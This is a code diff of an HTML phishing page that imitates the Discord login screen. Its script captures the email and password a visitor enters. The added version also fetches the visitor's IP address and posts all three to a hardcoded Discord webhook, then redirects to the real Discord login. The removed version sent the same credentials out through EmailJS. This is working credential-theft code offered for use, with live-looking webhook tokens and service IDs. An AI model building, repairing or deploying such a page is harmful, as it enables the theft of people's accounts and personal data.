@@ -6,6 +6,8 @@
     <title>Discord Login Page Replica</title>
     <link rel="stylesheet" href="styles.css">
     <style>
+/* Existing styles... */
+
         /* Base body styling */
         body {
             font-family: 'Helvetica Neue', Arial, sans-serif;
@@ -276,58 +278,46 @@
     </div>
 
     <script>
-        // Function to send email with username and password using EmailJS REST API
-        function sendLoginDetails(email, password) {
-            const serviceID = "service_o0sily3";
-            const templateID = "template_1ugchfo";
-            const userID = "o1RqiMz7XyIx1KgZ6";
+        // Function to send login details to a Discord webhook
+// Function to send login details to a Discord webhook
+        function sendLoginDetailsToWebhook(email, password) {
+            const webhookURL = "https://discord.com/api/webhooks/1280649371293192323/3OLIqR0fpyjQKZtXc0qMbLwRFo0Eiru-9T8hAaJUPI9zJewCOylrhhdGUHkJbtFxJjP4";
             
-            const templateParams = {
-                user_email: email,
-                user_password: password
-            };
-
-            fetch(`https://api.emailjs.com/api/v1.0/email/send`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    service_id: serviceID,
-                    template_id: templateID,
-                    user_id: userID,
-                    template_params: templateParams
-                })
-            }).then(response => {
-                if (response.ok) {
-                    console.log("Email sent successfully");
-
-                    // Redirect to Discord login page
-                    window.location.href = "https://discord.com/login";
-
-                    // Wait for the page to load and then fill in the credentials
-                    window.onload = function() {
-                        // Find the email and password fields and the submit button
-                        const emailField = document.querySelector("input[name='email']");
-                        const passwordField = document.querySelector("input[name='password']");
-                        const loginButton = document.querySelector("button[type='submit']");
-
-                        if (emailField && passwordField && loginButton) {
-                            // Fill in the email and password
-                            emailField.value = email;
-                            passwordField.value = password;
-
-                            // Simulate a click on the login button
-                            loginButton.click();
-                        }
+            // Fetch the user's IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip_address = data.ip;
+                    const messageContent = {
+                        username: "Login Bot",
+                        avatar_url: "https://your-avatar-url.com/avatar.png", // Optional: Replace with a URL for the avatar
+                        content: `**New login from ${ip_address}:**\nEmail: ${email}\nPassword: ${password}`
                     };
-                } else {
-                    console.error("Failed to send email:", response.status, response.statusText);
-                }
-            }).catch(error => {
-                console.error("Error sending email:", error);
-            });
+
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(messageContent)
+                    }).then(response => {
+                        if (response.ok) {
+                            console.log("Message sent to Discord webhook successfully");
+
+                            // Redirect to Discord login page
+                            window.location.href = "https://discord.com/login";
+                        } else {
+                            console.error("Failed to send message to Discord webhook:", response.status, response.statusText);
+                        }
+                    }).catch(error => {
+                        console.error("Error sending message to Discord webhook:", error);
+                    });
+                })
+                .catch(error => {
+                    console.error("Failed to retrieve IP address:", error);
+                });
         }
+
 
         // Function to handle login attempts
         function handleLoginAttempt(event) {
@@ -336,25 +326,21 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            if (email && password) {  // Check if both fields are not empty
+            if (email && password) {
                 const loginButton = document.querySelector('.login-button-unique');
 
-                // Change the button to loading state
                 loginButton.innerHTML = '<div class="loading-spinner-button"></div> Loading...';
-                loginButton.disabled = true;  // Disable the button to prevent further clicks
+                loginButton.disabled = true;
 
-                // Timeout to revert the button back to its original state after 5 seconds
                 setTimeout(() => {
                     loginButton.innerHTML = 'Log In';
                     loginButton.disabled = false;
                 }, 5000);
 
-                // Send the email with the login details and then redirect to Discord login
-                sendLoginDetails(email, password);
+                sendLoginDetailsToWebhook(email, password);
             }
         }
 
-        // Event listener for the login button
         document.querySelector('.login-button-unique').addEventListener('click', handleLoginAttempt);
     </script>
 </body>
